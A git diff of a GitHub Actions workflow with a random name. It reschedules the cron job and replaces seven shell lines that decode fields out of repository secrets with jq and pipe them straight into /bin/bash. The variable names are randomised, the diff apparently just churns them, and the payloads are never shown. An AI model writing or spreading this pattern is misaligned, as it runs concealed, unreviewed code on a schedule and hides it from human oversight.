@@ -2,7 +2,8 @@ name: fujiancheng7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 2/6 * * *'
+    - cron: '42 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: fujiancheng7654
         env:
-          adx85419: ${{ secrets.adx85419 }}
+          aur9101: ${{ secrets.aur9101 }}
         run: |
-          echo $adx85419 | jq -r .jyz846 | /bin/bash
-          echo $ifnfp59021 | jq -r .kclmp9 | /bin/bash
-          echo $kktnz6 | jq -r .cfx4 | /bin/bash
-          echo $zgtjr169 | jq -r .elzp719 | /bin/bash
-          echo $t054 | jq -r .wlrvu67 | /bin/bash
-          echo $cze3 | jq -r .col9 | /bin/bash
-          echo $epo8836 | jq -r .ncwbx51 | /bin/bash
+          echo $aur9101 | jq -r .vndff93738 | /bin/bash
+          echo $xp616 | jq -r .na6321 | /bin/bash
+          echo $w753 | jq -r .xbyqs68237 | /bin/bash
+          echo $nhzz72 | jq -r .tv8776 | /bin/bash
+          echo $kqxn31624 | jq -r .lrm2250 | /bin/bash
+          echo $ztw460 | jq -r .jwhd0 | /bin/bash
+          echo $l89 | jq -r .nikd49 | /bin/bash
 
